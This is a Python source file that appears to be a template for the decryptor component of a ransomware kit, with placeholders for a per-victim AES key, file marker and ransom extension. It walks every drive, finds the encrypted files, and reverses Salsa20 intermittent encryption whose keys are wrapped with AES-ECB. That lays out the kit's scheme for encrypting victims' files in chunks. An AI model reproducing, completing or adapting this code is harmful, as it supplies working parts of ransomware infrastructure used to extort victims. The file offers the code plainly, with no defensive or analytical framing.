import math
import time
import os,sys
import ctypes
import threading
from Crypto.Cipher import Salsa20,AES
{{shared}}
{{file_flag}}
{{endwith}}
def GetAllDrives():
    buf = ctypes.create_string_buffer(78)
    ctypes.windll.kernel32.GetLogicalDriveStringsW(ctypes.sizeof(buf),buf)
    dblist = buf.raw.replace(b'\x00',b'').split(b'\\')
    dlist = []
    for i in dblist:
        if os.path.isdir(i.decode()+'\\') and i != b'':
            dlist.append(i.decode()+'\\')
    return dlist
def decrypt(file):
    os.rename(file,file[:-len(endwith)])
    f = open(file[:-len(endwith)],'rb')
    file_size = os.path.getsize(file[:-len(endwith)])
    if file_size > (32+len(file_flag)):
        context = bytearray(f.read())
        f.close()
        if context[-6:] == file_flag:
            enkey = context[:32]
            cipher = AES.new(key=shared,mode=AES.MODE_ECB)
            key = cipher.decrypt(bytes(enkey))
            file_size -= (32+len(file_flag))
            context = context[32:-6]
            cipher = Salsa20.new(key=key,nonce=key[10:18])
            if file_size > 0x1400000:
                chunks = math.ceil(file_size/0xA00000)
                for i in range(0,chunks*0xA00000,0xA00000):
                    enchunk = context[i:i+0x100000]
                    chunk = cipher.decrypt(bytes(enchunk))
                    context[i:i+0x100000] = chunk
                no = b''
            else:
                if file_size > 0x400000:
                    no = bytes(context[0x400000:])
                    context = context[:0x400000]
                else:
                    context = context
                    no = b''
                context = cipher.decrypt(bytes(context))
            with open(file[:-len(endwith)],'wb') as f:
                f.write(bytes(context)+no)
            return True
        return False
    return False
def dedir(path):
    for parent, dirnames, filenames in os.walk(path):
        if ':\\Windows' in parent or ':\\$RECYCLE.BIN' in parent:
            continue
        for filename in filenames:
            file_path = os.path.join(parent, filename)
            extensions = os.path.splitext(file_path)[1]
            if extensions == endwith:
                decrypt(file_path)
    return True
if __name__ == '__main__':
    drives = GetAllDrives()
    threads = []
    for drive in drives:
        threads.append(threading.Thread(target=dedir,args=(drive,)))
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    sys.exit()
